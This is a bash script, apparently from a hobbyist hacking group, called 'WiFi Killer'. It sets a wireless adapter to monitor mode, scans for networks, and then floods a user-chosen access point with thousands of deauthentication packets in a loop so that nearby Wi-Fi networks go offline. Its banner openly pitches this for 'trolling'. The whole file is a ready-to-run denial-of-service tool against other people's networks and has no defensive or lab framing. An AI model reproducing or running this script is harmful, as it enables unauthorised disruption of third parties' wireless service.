##!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"
clear
echo -e $GREEN '
 __      __._____________.__   ____  __.__.__  .__                
/  \    /  \__\_   _____/|__| |    |/ _|__|  | |  |   ___________ 
\   \/\/   /  ||    __)  |  | |      < |  |  | |  | _/ __ \_  __ \
 \        /|  ||     \   |  | |    |  \|  |  |_|  |_\  ___/|  | \/
  \__/\  / |__|\___  /   |__| |____|__ \__|____/____/\___  >__|   
       \/          \/                 \/                 \/       
						        @viperzcrew

'
echo -e $RED " "
echo -e $RED '
Welcome to the WiFi Killer, this is an simple tool to kill nearby wifi networks.
Please do not use it for revange, only for trolling.
Written by MrBlackX
'
echo " "
echo -e $CYAN "
[*] You will get now options to setting up your wireless adapter, 
if you already started your wireless adapter into monitor mode, 
skip it with n for no."
echo -e $YELLOW " "

echo -e $CYAN "
[1] Start Monitor Mode [Required]
[2] Scan For A Target & Attack Them [Attack]
[3] Credits
[4] Exit
"

read -p "[*] Choose an option: " inp1

if [[ "$inp1" = 1 ]]; then
	echo -e $RED "[!] Note your common wireless mode is wlan0, if you do not use any other wireless hardwares,
	then type ifconfig to see your wireless adapter, it is mostly wlan0.
	"
	read -p "[*] Enter your wireless mode(default: wlan0): " mode1
	figlet Killing Network Processes...
	airmon-ng check kill
	airmon-ng start $mode1
	echo -e $PURPLE "Done.."
        bash /root/wireless_dos.sh

fi


clear

if [[ "$inp1" = 2 ]]; then
	echo -e $PURPLE " "
	figlet Target Scanner
	read -p "[*] Enter your wireless mode(default: wlan0mon): " mode2
	clear
	figlet Scanning...
	echo -e $RED "[!] PRESS CTRL+C TO STOP THE SCAN!"
	sleep 2
	airodump-ng $mode2
	echo -e $BLUE " "
	read -p "[*] Enter the Target BSSID: " target
	read -p "[?] Do you want to perfom an Attack? [y/N]" ask
	if [[ "$ask" = "y" || "$ask" = "Y" ]]; then
		echo -e $BLUE " "
		echo "[!] YOUR TARGET IS: $target"
		sleep 5
		clear
		echo -e $YELLOW " "
		figlet Killing Selected Wifi...
		for i in {1..5000}
		do

			aireplay-ng --deauth 10000 -a $target $mode2
			sleep 1
		done
		echo -e $GREEN "[+] You have successfully killed the Network.
		Exiting in 3 seconds...
		"
	fi
	bash /root/wireless_dos.sh
fi

if [[ "$inp1" = 3 ]]; then
	echo -e $BLUE " "
	figlet VIPERZCREW
	echo "coded by mrblackx!"
	echo "YouTube:  https://www.youtube.com/channel/UCWzhjHOUFTqi3bCxbNo4kqg"
	echo "GitHub:   https://github.com/ViperZCrew"
	echo "WhatsApp: https://wa.me/4915206072840"
	echo "E-Mail:	(SOON)"
sleep 5
fi

if [[ "$inp1" = 4 ]]; then
	exit
fi

sleep 3
exit

